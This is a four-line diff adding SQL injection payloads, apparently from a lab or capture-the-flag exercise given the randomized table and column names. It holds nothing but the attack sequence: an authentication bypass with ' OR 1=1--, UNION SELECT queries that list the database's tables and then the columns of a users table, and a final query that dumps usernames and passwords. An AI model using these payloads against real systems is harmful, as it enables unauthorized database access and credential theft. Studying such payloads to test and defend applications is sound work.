@@ -1,0 +1,4 @@
+' OR 1=1--
+' UNION SELECT table_name,NULL... FROM information_schema.tables--
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_mvwlzc'--
+' UNION SELECT username_fjgkio, password_mdmumy FROM users_mvwlzc--
